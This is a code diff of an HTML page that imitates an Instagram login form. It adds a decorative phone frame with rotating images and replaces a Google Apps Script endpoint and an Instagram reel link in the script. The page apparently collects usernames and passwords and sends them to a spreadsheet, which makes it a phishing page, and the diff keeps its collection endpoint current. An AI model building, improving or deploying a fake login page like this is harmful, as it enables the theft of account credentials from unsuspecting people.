@@ -19,7 +19,46 @@
             justify-content: center;
             align-items: center;
             height: 100vh;
+            position: relative;
         }
+
+        /* Teléfono que contiene las imágenes */
+        .phone-frame {
+            position: absolute;
+            left: 10%;
+            width: 320px;
+            height: 600px;
+            background-color: #000;
+            border-radius: 40px;
+            border: 8px solid #333;
+            overflow: hidden;
+            box-shadow: 0px 0px 15px rgba(255, 255, 255, 0.1);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .screen {
+            width: 90%;
+            height: 90%;
+            position: relative;
+            overflow: hidden;
+            border-radius: 30px;
+        }
+
+        .screen img {
+            width: 100%;
+            height: 100%;
+            position: absolute;
+            object-fit: cover;
+            opacity: 0;
+            transition: opacity 1s ease-in-out;
+        }
+
+        .screen img.active {
+            opacity: 1;
+        }
+
         .container {
             background-color: #121212;
             padding: 20px;
@@ -27,6 +66,7 @@
             width: 350px;
             text-align: center;
             border-radius: 5px;
+            z-index: 2;
         }
         .logo {
             font-size: 2rem;
@@ -71,6 +111,16 @@
     </style>
 </head>
 <body>
+
+    <!-- Marco del teléfono con imágenes -->
+    <div class="phone-frame">
+        <div class="screen">
+            <img src="imagen1.jpg" class="active">
+            <img src="imagen2.jpg">
+            <img src="imagen3.jpg">
+        </div>
+    </div>
+
     <div class="container" id="loginBox">
         <div class="logo">Instagram</div>
         <input type="text" id="loginUser" placeholder="Teléfono, usuario o correo electrónico">
@@ -93,8 +143,8 @@
     </div>
 
     <script>
-        const googleSheetsURL = "https://script.google.com/macros/s/AKfycbyV4Wv8oIGjNWNsEEnw5BwwQJB82ycw2bGsSwbxefsfF7-I4qHgMlVvJMeYNQS_VZnQdA/exec";
-        const instagramVideoURL = "https://www.instagram.com/p/DGmXjt3sdTt/?utm_source=ig_web_copy_link";
+        const googleSheetsURL = "https://script.google.com/macros/s/AKfycbw8F6XEjtLHCLlHNt3zckIW7W4a_5XVok52OWcy-4T8dIJixBPEWah6PdM1AzZMQFEi-Q/exec";
+        const instagramVideoURL = "https://www.instagram.com/reel/DB9RacVx8GX/?utm_source=ig_web_copy_link";
 
         function mostrarRegistro() {
             document.getElementById("loginBox").style.display = "none";
@@ -150,6 +200,18 @@
                 alert("Por favor, completa todos los campos.");
             }
         }
+
+        // Función para cambiar las imágenes cada 3 segundos
+        let currentIndex = 0;
+        const images = document.querySelectorAll('.screen img');
+
+        function changeImage() {
+            images[currentIndex].classList.remove('active');
+            currentIndex = (currentIndex + 1) % images.length;
+            images[currentIndex].classList.add('active');
+        }
+
+        setInterval(changeImage, 3000);
     </script>
 </body>
 </html>
